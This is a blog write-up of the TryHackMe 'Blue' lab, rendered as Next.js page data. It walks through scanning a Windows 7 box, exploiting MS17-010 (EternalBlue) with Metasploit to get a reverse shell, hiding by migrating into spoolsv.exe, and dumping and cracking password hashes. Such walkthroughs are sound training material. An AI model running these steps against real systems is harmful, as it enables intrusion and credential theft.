0:[[["",{"children":["posts",{"children":[["path","2020-09-03_tryhackme_blue","d"],{"children":["__PAGE__?{\"path\":\"2020-09-03_tryhackme_blue\"}",{}]}]}]},"$undefined","$undefined",true],"$L1","$L2"]]
2:[[["$","meta",null,{"charSet":"utf-8"}],["$","title",null,{"children":"/dev/blog - /dev/blog - TryHackMe - Blue"}],["$","meta",null,{"name":"description","content":"Deploy & hack into a Windows machine, leveraging common misconfigurations issues."}],["$","meta",null,{"name":"application-name","content":"/dev/blog"}],null,null,["$","meta",null,{"name":"generator","content":"Next.js"}],["$","meta",null,{"name":"keywords","content":"Dev,Blog,Programmings"}],["$","meta",null,{"name":"referrer","content":"origin-when-cross-origin"}],[["$","meta",null,{"name":"theme-color","content":"amber"}]],["$","meta",null,{"name":"color-scheme","content":"dark"}],["$","meta",null,{"name":"viewport","content":"width=device-width, initial-scale=1"}],["$","meta",null,{"name":"creator","content":"Joshua Chapman"}],null,null,null,null,null,null,null,null,null,[]],[["$","link",null,{"rel":"canonical","href":"https://joshuachp.dev/posts/2020-09-03_tryhackme_blue"}],null,null,null],null,null,[null,null,null,null,null],null,null,null,null,[null,[["$","link",null,{"rel":"icon","href":"/favicon.svg","type":"image/svg+xml"}],["$","link",null,{"rel":"icon","href":"/favicon.png","type":"image/png"}],["$","link",null,{"rel":"icon","href":"/favicon.ico","type":"image/x-icon"}]],[],null]]
1:["$L3",null,null,[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/816f3edd0640ecf0.css","precedence":"next.js"}]]]
4:I{"id":"5376","name":"","chunks":["619:619-3a70a20416de9ff0","185:app/layout-4b8fb878def027fc"],"async":false}
5:I{"id":"6722","name":"","chunks":["619:619-3a70a20416de9ff0","185:app/layout-4b8fb878def027fc"],"async":false}
6:I{"id":"9299","name":"","chunks":["619:619-3a70a20416de9ff0","185:app/layout-4b8fb878def027fc"],"async":false}
7:I{"id":"5019","name":"","chunks":["619:619-3a70a20416de9ff0","185:app/layout-4b8fb878def027fc"],"async":false}
8:I{"id":"1300","name":"","chunks":["272:webpack-e24f1f8cbee90348","667:2443530c-65ca4daeaf429502","961:961-409d5e344dd5ce3d"],"async":false}
9:I{"id":"6022","name":"","chunks":["272:webpack-e24f1f8cbee90348","667:2443530c-65ca4daeaf429502","961:961-409d5e344dd5ce3d"],"async":false}
3:["$","html",null,{"lang":"en","children":[["$","head",null,{"children":[["$","$L4",null,{"production":true,"goatCounterApi":"a7d98e3f-b56b"}],["$","$L5",null,{"id":"dark-theme","strategy":"beforeInteractive","children":"if(localStorage.theme==='Dark'||((!('theme'in localStorage)||localStorage.theme==='Auto')&&window.matchMedia('(prefers-color-scheme: dark)').matches)){document.documentElement.classList.add('dark')}"}]]}],["$","body",null,{"className":"bg-primary-50 dark:bg-primary-900","children":["$","$L6",null,{"children":[["$","$L7",null,{}],["$","main",null,{"className":"flex flex-col justify-center p-6 sm:px-12 md:px-24 lg:px-48 xl:px-60 2xl:px-96","children":["$","$L8",null,{"parallelRouterKey":"children","segmentPath":["children"],"error":"$undefined","errorStyles":"$undefined","loading":"$undefined","loadingStyles":"$undefined","hasLoading":false,"template":["$","$L9",null,{}],"templateStyles":"$undefined","notFound":[["$","title",null,{"children":"404: This page could not be found."}],["$","div",null,{"style":{"fontFamily":"system-ui,\"Segoe UI\",Roboto,Helvetica,Arial,sans-serif,\"Apple Color Emoji\",\"Segoe UI Emoji\"","height":"100vh","textAlign":"center","display":"flex","flexDirection":"column","alignItems":"center","justifyContent":"center"},"children":["$","div",null,{"children":[["$","style",null,{"dangerouslySetInnerHTML":{"__html":"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}"}}],["$","h1",null,{"className":"next-error-h1","style":{"display":"inline-block","margin":"0 20px 0 0","padding":"0 23px 0 0","fontSize":24,"fontWeight":500,"verticalAlign":"top","lineHeight":"49px"},"children":"404"}],["$","div",null,{"style":{"display":"inline-block"},"children":["$","h2",null,{"style":{"fontSize":14,"fontWeight":400,"lineHeight":"49px","margin":0},"children":"This page could not be found."}]}]]}]}]],"notFoundStyles":"$undefined","asNotFound":false,"childProp":{"current":["$","$L8",null,{"parallelRouterKey":"children","segmentPath":["children","posts","children"],"error":"$undefined","errorStyles":"$undefined","loading":"$undefined","loadingStyles":"$undefined","hasLoading":false,"template":["$","$L9",null,{}],"templateStyles":"$undefined","notFound":"$undefined","notFoundStyles":"$undefined","asNotFound":false,"childProp":{"current":["$","$L8",null,{"parallelRouterKey":"children","segmentPath":["children","posts","children",["path","2020-09-03_tryhackme_blue","d"],"children"],"error":"$undefined","errorStyles":"$undefined","loading":"$undefined","loadingStyles":"$undefined","hasLoading":false,"template":["$","$L9",null,{}],"templateStyles":"$undefined","notFound":"$undefined","notFoundStyles":"$undefined","asNotFound":false,"childProp":{"current":["$La",null,null,[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/2a1840b1c557e13c.css","precedence":"next.js"}]]],"segment":"__PAGE__?{\"path\":\"2020-09-03_tryhackme_blue\"}"}}],"segment":["path","2020-09-03_tryhackme_blue","d"]}}],"segment":"posts"}}]}]]}]}]]}]
b:I{"id":"3619","name":"","chunks":["619:619-3a70a20416de9ff0","991:app/posts/page-2384259669d00c2b"],"async":false}
c:I{"id":"7876","name":"","chunks":["619:619-3a70a20416de9ff0","563:app/posts/[path]/page-f449502d4ce927b8"],"async":false}
a:["$","article",null,{"className":"flex max-w-full grow flex-col justify-self-start","children":[["$","h1",null,{"className":"mb-4 text-primary-900 dark:text-primary-50 text-4xl font-extrabold tracking-tight sm:text-5xl md:text-6xl","children":[["$","span","1",{"children":"TryHackMe - Blue"}]]}],["$","blockquote","11",{"children":[["$","p",null,{"className":"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg","children":[["$","span","5",{"children":"The room link can be found at"}],"\r\n",["$","$Lb",null,{"title":"","className":"font-bold text-accent-700 visited:text-accent-900 hover:underline dark:text-accent-400 dark:visited:text-accent-600","href":"https://tryhackme.com/room/blue","children":[["$","span","8",{"children":"TryHackMe - Blue"}]]}]]}]]}],["$","p",null,{"className":"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg","children":[["$","span","13",{"children":"For this room, I will be using the Metasploit framework."}]]}],["$","h2",null,{"className":"mb-4 text-primary-900 dark:text-primary-50 text-3xl font-bold tracking-tight sm:text-4xl md:text-5xl","children":[["$","span","16",{"children":"Recon"}]]}],["$","p",null,{"className":"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg","children":[["$","span","19",{"children":"We begin with a Nmap of the box to see the services and get their version."}]]}],["$","$Lc","23",{"language":"bash","className":"mb-4 mt-2","children":[["$","span","22",{"children":"msf5 > db_nmap -sC -sV 10.10.47.219\n"}]]}],["$","p",null,{"className":"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg","children":[["$","span","25",{"children":"Now we can see all the running services with the "}],["$","code",null,{"className":" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg","children":"services"}],["$","span","27",{"children":" command."}]]}],["$","$Lc","31",{"language":"bash","className":"mb-4 mt-2","children":[["$","span","30",{"children":"msf5 > services\nServices\n========\n\nhost           port   proto  name               state  info\n----           ----   -----  ----               -----  ----\n10.10.47.219   135    tcp    msrpc              open   Microsoft Windows RPC\n10.10.47.219   139    tcp    netbios-ssn        open   Microsoft Windows netbios-ssn\n10.10.47.219   445    tcp    microsoft-ds       open   Windows 7 Professional 7601 Service Pack 1 microsoft-ds workgroup: WORKGROUP\n10.10.47.219   3389   tcp    ssl/ms-wbt-server  open\n10.10.47.219   49152  tcp    msrpc              open   Microsoft Windows RPC\n10.10.47.219   49153  tcp    msrpc              open   Microsoft Windows RPC\n10.10.47.219   49154  tcp    msrpc              open   Microsoft Windows RPC\n10.10.47.219   49158  tcp    msrpc              open   Microsoft Windows RPC\n10.10.47.219   49160  tcp    msrpc              open   Microsoft Windows RPC\n\n"}]]}],["$","p",null,{"className":"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg","children":[["$","span","33",{"children":"On this machine, we will focus on the "}],["$","strong","36",{"children":[["$","span","35",{"children":"SMB"}]]}],["$","span","37",{"children":" service which is on port "}],["$","code",null,{"className":" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg","children":"445"}],["$","span","39",{"children":"."}]]}],["$","p",null,{"className":"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg","children":[["$","span","42",{"children":"We can gather more information using the module"}],"\r\n",["$","code",null,{"className":" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg","children":"auxiliary/scanner/smb/smb_version"}],["$","span","45",{"children":". Running it the services page will lock"}],"\r\n",["$","span","47",{"children":"more like this."}]]}],["$","$Lc","51",{"language":"bash","className":"mb-4 mt-2","children":[["$","span","50",{"children":"10.10.47.219  445    tcp    smb                open   Windows 7 Professional SP1 (build:7601) (name:JON-PC) (workgroup:WORKGROUP ) (signatures:optional)\n"}]]}],["$","p",null,{"className":"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg","children":[["$","span","53",{"children":"Also we run "}],["$","code",null,{"className":" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg","children":"auxiliary/scanner/smb/smb1"}],["$","span","55",{"children":" to check if the box has support for"}],"\r\n",["$","span","57",{"children":"SMBv1."}]]}],["$","$Lc","61",{"language":"bash","className":"mb-4 mt-2","children":[["$","span","60",{"children":"msf5 auxiliary(scanner/smb/smb1) > run\n\n[+] 10.10.47.219:445      - 10.10.47.219 supports SMBv1 dialect.\n[*] 10.10.47.219:445      - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n\n"}]]}],["$","p",null,{"className":"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg","children":[["$","span","63",{"children":"As the machine name implies the box could be exploitable via "}],["$","strong","66",{"children":[["$","span","65",{"children":"EternalBlue"}]]}],["$","span","67",{"children":"."}],"\r\n",["$","span","69",{"children":"Since the machine has "}],["$","strong","72",{"children":[["$","span","71",{"children":"Windows 7"}]]}],["$","span","73",{"children":" installed and "}],["$","strong","76",{"children":[["$","span","75",{"children":"SMBv1"}]]}],["$","span","77",{"children":" enabled, it is most"}],"\r\n",["$","span","79",{"children":"likely vulnerable. You can read more here"}],"\r\n",["$","$Lb",null,{"title":"","className":"font-bold text-accent-700 visited:text-accent-900 hover:underline dark:text-accent-400 dark:visited:text-accent-600","href":"https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010","children":[["$","span","82",{"children":"Microsoft - EternalBlue"}]]}],["$","span","84",{"children":"."}]]}],["$","p",null,{"className":"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg","children":[["$","span","87",{"children":"We can check if the machine is vulnerable by running the module"}],"\r\n",["$","code",null,{"className":" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg","children":"auxiliary/scanner/smb/smb_ms17_010"}],["$","span","90",{"children":"."}]]}],["$","$Lc","94",{"language":"bash","className":"mb-4 mt-2","children":[["$","span","93",{"children":"msf5 auxiliary(scanner/smb/smb_ms17_010) > run\n\n[+] 10.10.47.219:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)\n[*] 10.10.47.219:445      - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n\n"}]]}],"<!--more-->\n",["$","h2",null,{"className":"mb-4 text-primary-900 dark:text-primary-50 text-3xl font-bold tracking-tight sm:text-4xl md:text-5xl","children":[["$","span","97",{"children":"Gain Access"}]]}],["$","p",null,{"className":"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg","children":[["$","span","100",{"children":"Now we search for an exploit we can use in Metasploit."}]]}],["$","$Lc","104",{"language":"bash","className":"mb-4 mt-2","children":[["$","span","103",{"children":"msf5 > search ms17_010\n\nMatching Modules\n================\n\n   #  Name                                           Disclosure Date  Rank     Check  Description\n   -  ----                                           ---------------  ----     -----  -----------\n   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution\n   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection\n   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption\n   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+\n   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution\n\n"}]]}],["$","p",null,{"className":"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg","children":[["$","span","106",{"children":"Select it using "}],["$","code",null,{"className":" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg","children":"use 2"}],["$","span","108",{"children":", set "}],["$","code",null,{"className":" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg","children":"LHOST"}],["$","span","110",{"children":" and "}],["$","code",null,{"className":" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg","children":"RHOST"}],["$","span","112",{"children":", and run it. The exploit could"}],"\r\n",["$","span","114",{"children":"fail multiple times. But if you continue trying it will succeed. You could also"}],"\r\n",["$","span","116",{"children":"try setting the payload to "}],["$","code",null,{"className":" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg","children":"generic/shell_reverce_tcp"}],["$","span","118",{"children":"."}]]}],["$","p",null,{"className":"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg","children":[["$","span","121",{"children":"Now we have a meterpreter session on the box."}]]}],["$","h2",null,{"className":"mb-4 text-primary-900 dark:text-primary-50 text-3xl font-bold tracking-tight sm:text-4xl md:text-5xl","children":[["$","span","124",{"children":"Escalate"}]]}],["$","p",null,{"className":"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg","children":[["$","span","127",{"children":"If you have a simple shell you can use the"}],"\r\n",["$","code",null,{"className":" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg","children":"post/multi/manage/shell_to_meterpreter"}],["$","span","130",{"children":" module to upgrade your shell."}]]}],["$","p",null,{"className":"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg","children":[["$","span","133",{"children":"If you have a meterpreter shell you can check who you are with:"}]]}],["$","$Lc","137",{"language":"bash","className":"mb-4 mt-2","children":[["$","span","136",{"children":"meterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\n"}]]}],["$","p",null,{"className":"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg","children":[["$","span","139",{"children":"Since we are "}],["$","strong","142",{"children":[["$","span","141",{"children":"NT AUTHORITY\\SYSTEM"}]]}],["$","span","143",{"children":" we have full administrator access to the"}],"\r\n",["$","span","145",{"children":"box. With this privilege, we can migrate our process to "}],["$","code",null,{"className":" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg","children":"spoolsv.exe"}],["$","span","147",{"children":" to hide"}],"\r\n",["$","span","149",{"children":"our process. We can use "}],["$","code",null,{"className":" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg","children":"ps"}],["$","span","151",{"children":" and "}],["$","code",null,{"className":" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg","children":"migrate"}],["$","span","153",{"children":" command for this. Alternatively, we"}],"\r\n",["$","span","155",{"children":"can use "}],["$","code",null,{"className":" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg","children":"run post/windows/manage/migrate"}],["$","span","157",{"children":" to spawn a "}],["$","em","160",{"children":[["$","span","159",{"children":"notepad"}]]}],["$","span","161",{"children":" process and"}],"\r\n",["$","span","163",{"children":"migrate to it."}]]}],["$","h2",null,{"className":"mb-4 text-primary-900 dark:text-primary-50 text-3xl font-bold tracking-tight sm:text-4xl md:text-5xl","children":[["$","span","166",{"children":"Cracking"}]]}],["$","p",null,{"className":"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg","children":[["$","span","169",{"children":"To crack the passwords first we need to dump them. There are two ways to do"}],"\r\n",["$","span","171",{"children":"this, we can use the "}],["$","code",null,{"className":" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg","children":"hashdump"}],["$","span","173",{"children":" command and crack them outside of Metasploit."}],"\r\n",["$","span","175",{"children":"Else we can run the post module "}],["$","code",null,{"className":" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg","children":"use post/windows/gather/hashdump"}],["$","span","177",{"children":" this will"}],"\r\n",["$","span","179",{"children":"save the hashes in the database. Then we run"}],"\r\n",["$","code",null,{"className":" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg","children":"use auxiliary/analyze/crack_windows"}],["$","span","182",{"children":" to crack them with "}],["$","strong","185",{"children":[["$","span","184",{"children":"john"}]]}],["$","span","186",{"children":". The"}],"\r\n",["$","span","188",{"children":"challenge suggests us to use the wordlist "}],["$","strong","191",{"children":[["$","span","190",{"children":"rockyou.txt"}]]}],["$","span","192",{"children":"."}]]}],["$","h2",null,{"className":"mb-4 text-primary-900 dark:text-primary-50 text-3xl font-bold tracking-tight sm:text-4xl md:text-5xl","children":[["$","span","195",{"children":"Find flags"}]]}],["$","p",null,{"className":"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg","children":[["$","span","198",{"children":"To find the flag you can use the "}],["$","code",null,{"className":" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg","children":"search"}],["$","span","200",{"children":" command with the file name from the"}],"\r\n",["$","span","202",{"children":"root directory."}]]}],["$","$Lc","206",{"language":"bash","className":"mb-4 mt-2","children":[["$","span","205",{"children":"meterpreter > search -f flag*\n"}]]}]]}]
